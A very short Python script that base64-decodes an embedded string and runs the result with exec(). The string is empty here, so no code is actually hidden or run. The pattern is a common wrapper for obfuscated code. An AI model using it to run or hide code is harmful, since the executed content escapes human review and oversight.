import base64
f='''
'''
f=f.replace(chr(10),'')
to_exec=base64.b64decode(f.encode())
to_exec=to_exec.decode('utf-8')
a=exec(to_exec)